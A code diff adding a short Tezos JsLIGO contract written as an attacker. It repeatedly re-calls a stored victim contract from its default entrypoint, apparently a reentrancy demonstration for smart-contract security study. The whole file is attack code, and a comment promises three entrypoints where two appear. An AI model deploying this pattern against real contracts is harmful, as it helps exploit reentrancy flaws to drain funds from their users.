@@ -1,0 +1,33 @@
+export type storage = { nbCalls: int; victimAddress: address };
+
+type ret = [list<operation>, storage];
+
+// Three entrypoints
+
+@entry
+const attack = (_: unit, s: storage): ret => {
+    return match(Tezos.get_contract_opt(s.victimAddress)) {
+        when (None()):
+            failwith("cannot find victim contract ")
+        when (Some(victimContract)):
+            do {
+                const op = Tezos.transaction(unit, 0mutez, victimContract)
+                return [list([op]), s]
+            }
+    }
+};
+
+@entry
+const @default = (_p: unit, s: storage): ret => {
+    if (s.nbCalls > 0) {
+        return match(Tezos.get_contract_opt(s.victimAddress)) {
+            when (None()):
+                failwith("cannot find victim contract ")
+            when (Some(victimContract)):
+                do {
+                    const op = Tezos.transaction(unit, 0mutez, victimContract)
+                    return [list([op]), { ...s, nbCalls: s.nbCalls - 1 }]
+                }
+        }
+    } else return [list([]), { ...s, nbCalls: s.nbCalls - 1 }];
+}
